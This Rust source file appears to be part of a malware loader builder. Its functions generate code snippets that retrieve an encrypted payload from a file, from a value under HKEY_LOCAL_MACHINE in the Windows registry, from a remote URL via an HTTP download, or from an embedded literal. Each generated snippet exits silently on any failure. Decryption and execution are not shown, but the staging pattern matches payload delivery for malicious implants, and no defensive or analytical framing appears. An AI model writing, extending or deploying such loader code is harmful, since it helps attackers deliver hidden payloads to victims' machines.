#![allow(dead_code)]

pub fn payload_from_file_snippet(path: &str) -> String {
    format!(
        r#"    // Payload retrieval: from file
    let encrypted_payload = std::fs::read(r"{path}")
        .unwrap_or_else(|_| std::process::exit(0));"#,
        path = path
    )
}

pub fn payload_from_registry_snippet(key: &str) -> String {
    // Split the key into hive path and value name
    let (subkey, value_name) = if let Some(pos) = key.rfind('\\') {
        (&key[..pos], &key[pos + 1..])
    } else {
        (key, "")
    };

    // Escape backslashes for embedding in generated Rust string literals
    let subkey_escaped = subkey.replace('\\', "\\\\");
    let value_name_escaped = value_name.replace('\\', "\\\\");

    format!(
        r#"    // Payload retrieval: from registry
    let encrypted_payload = {{
        use windows_sys::Win32::System::Registry::*;
        unsafe {{
            let subkey: Vec<u16> = "{subkey_escaped}".encode_utf16().chain(std::iter::once(0)).collect();
            let value_name: Vec<u16> = "{value_name_escaped}".encode_utf16().chain(std::iter::once(0)).collect();
            let mut hkey: HKEY = std::ptr::null_mut();
            let status = RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                subkey.as_ptr(),
                0,
                KEY_READ,
                &mut hkey,
            );
            if status != 0 {{ std::process::exit(0); }}
            let mut data_size: u32 = 0;
            let status = RegQueryValueExW(
                hkey,
                value_name.as_ptr(),
                std::ptr::null(),
                std::ptr::null_mut(),
                std::ptr::null_mut(),
                &mut data_size,
            );
            if status != 0 {{ std::process::exit(0); }}
            let mut data = vec![0u8; data_size as usize];
            let status = RegQueryValueExW(
                hkey,
                value_name.as_ptr(),
                std::ptr::null(),
                std::ptr::null_mut(),
                data.as_mut_ptr(),
                &mut data_size,
            );
            RegCloseKey(hkey);
            if status != 0 {{ std::process::exit(0); }}
            data.truncate(data_size as usize);
            data
        }}
    }};"#,
        subkey_escaped = subkey_escaped,
        value_name_escaped = value_name_escaped
    )
}

pub fn payload_from_url_snippet(url: &str) -> String {
    format!(
        r#"    // Payload retrieval: from URL
    let encrypted_payload = {{
        let response = reqwest::blocking::get("{url}")
            .unwrap_or_else(|_| std::process::exit(0));
        if !response.status().is_success() {{ std::process::exit(0); }}
        response.bytes()
            .unwrap_or_else(|_| std::process::exit(0))
            .to_vec()
    }};"#,
        url = url
    )
}

pub fn payload_embedded_snippet(encoded_literal: &str) -> String {
    format!(
        r#"    // Payload: embedded
    let encoded_data = {literal};
    "#,
        literal = encoded_literal
    )
}
